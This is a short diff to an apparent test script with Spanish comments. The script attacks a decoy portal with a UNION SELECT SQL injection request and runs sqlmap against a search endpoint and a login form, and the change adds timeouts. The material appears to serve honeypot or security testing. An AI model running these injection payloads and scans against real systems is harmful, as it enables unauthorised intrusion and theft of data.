@@ -32,15 +32,15 @@ curl -s "$DECOY_PORTAL/contribuyentes/buscar/?nit=1'+UNION+SELECT+1,2,3--" \
 
 # 2. SQLMap contra el endpoint vulnerable
 echo "[*] Fase 2: SQLMap scan"
-sqlmap -u "$DECOY_PORTAL/contribuyentes/buscar/?nit=1*" \
-    --batch --level=3 --risk=2 \
+timeout 180 sqlmap -u "$DECOY_PORTAL/contribuyentes/buscar/?nit=1*" \
+    --batch --level=3 --risk=2 --timeout=10 \
     --output-dir="$EVIDENCE_DIR/sqlmap_output" 2>/dev/null || true
 
 # 3. SQLMap contra login vulnerable
 echo "[*] Fase 3: SQLMap contra login endpoint"
-sqlmap -u "$DECOY_PORTAL/vuln/sqli-login/" \
+timeout 180 sqlmap -u "$DECOY_PORTAL/vuln/sqli-login/" \
     --data="username=admin&password=test" \
-    --batch --level=3 --risk=2 \
+    --batch --level=3 --risk=2 --timeout=10 \
     --output-dir="$EVIDENCE_DIR/sqlmap_login_output" 2>/dev/null || true
 
 END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
